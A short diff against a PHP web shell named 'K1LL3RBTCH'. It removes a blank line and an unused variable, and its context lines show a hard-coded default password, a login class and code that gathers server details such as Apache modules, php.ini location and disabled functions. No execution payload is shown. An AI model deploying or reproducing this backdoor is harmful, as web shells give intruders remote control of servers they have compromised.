@@ -35,7 +35,6 @@ CONST AUTHOR    = "It0sh1";
 CONST SHELLNAME = "K1LL3RBTCH";
 CONST VERSION   = "v1.0.0";
 
-
 $pass_key = "password"; // you can set your own password
 
 // directory permissions example: (0777)
@@ -65,10 +64,6 @@ $apache2_modules = apache_get_modules();
 $phpconf         = php_ini_loaded_file();
 $phpfunctions    = @ini_get('disable_functions');
 $php_version     = phpversion();
-
-// dont change this unique value, otherwise it will
-// include the important message in all the $_GET function
-$unique_value = false;
 
 // just making a login system.
 class LoginSystem
